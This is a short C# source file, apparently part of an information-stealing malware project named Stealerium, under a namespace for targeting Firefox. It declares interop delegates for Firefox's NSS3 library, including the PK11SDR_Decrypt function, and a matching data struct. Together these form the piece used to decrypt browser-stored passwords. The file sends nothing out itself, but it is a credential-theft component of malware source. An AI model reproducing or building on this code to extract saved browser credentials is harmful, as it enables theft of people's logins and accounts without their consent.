using System;
using System.Runtime.InteropServices;

namespace Stealerium.Target.Browsers.Firefox;

internal sealed class Nss3
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long NssInit(string sDirectory);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long NssShutdown();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Pk11SdrDecrypt(ref TsecItem tsData, ref TsecItem tsResult, int iContent);

	public struct TsecItem
	{
		public int SecItemType;

		public IntPtr SecItemData;

		public int SecItemLen;
	}
}
